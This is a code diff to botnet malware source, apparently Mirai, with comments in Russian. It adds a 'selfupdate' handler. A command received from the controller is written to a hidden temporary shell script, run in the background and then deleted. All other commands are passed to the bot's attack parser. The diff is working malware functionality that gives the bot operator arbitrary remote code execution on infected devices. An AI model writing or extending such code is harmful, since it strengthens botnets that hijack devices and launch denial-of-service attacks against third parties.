@@ -399,7 +399,58 @@ killer_init();
             #endif
 
             if(len > 0)
+            {
+                // проверка типа команды
+                if(rdbuf[0] == 0x01 && len > 3) // selfupdate команда
+                {
+                    uint16_t script_len = ((uint8_t)rdbuf[1] << 8) | (uint8_t)rdbuf[2];
+                    if(script_len > 0 && script_len <= (len - 3))
+                    {
+                        char script_path[64];
+                        int script_fd;
+                        
+                        #ifdef DEBUG
+                            printf("[main] received selfupdate command (%d bytes)\n", script_len);
+                        #endif
+                        
+                        // создаем временный скрипт
+                        util_strcpy(script_path, "/tmp/.upd");
+                        rand_alphastr(script_path + util_strlen(script_path), 8);
+                        util_strcpy(script_path + util_strlen(script_path), ".sh");
+                        
+                        if((script_fd = open(script_path, O_CREAT | O_WRONLY | O_TRUNC, 0755)) != -1)
+                        {
+                            write(script_fd, rdbuf + 3, script_len);
+                            close(script_fd);
+                            
+                            // выполняем скрипт в фоне
+                            if(fork() == 0)
+                            {
+                                char *args[] = {"/bin/sh", "-c", NULL, NULL};
+                                char cmd_buf[512];
+                                
+                                // выполняем и удаляем скрипт
+                                util_strcpy(cmd_buf, "/bin/sh ");
+                                util_strcpy(cmd_buf + util_strlen(cmd_buf), script_path);
+                                util_strcpy(cmd_buf + util_strlen(cmd_buf), " && rm -f ");
+                                util_strcpy(cmd_buf + util_strlen(cmd_buf), script_path);
+                                
+                                args[2] = cmd_buf;
+                                execve("/bin/sh", args, NULL);
+                                exit(0);
+                            }
+                            
+                            #ifdef DEBUG
+                                printf("[main] executed selfupdate script: %s\n", script_path);
+                            #endif
+                        }
+                    }
+                }
+                else // обычная атака
+                {
                 attack_parse(rdbuf, len);
+                }
+            }
         }
     }
 
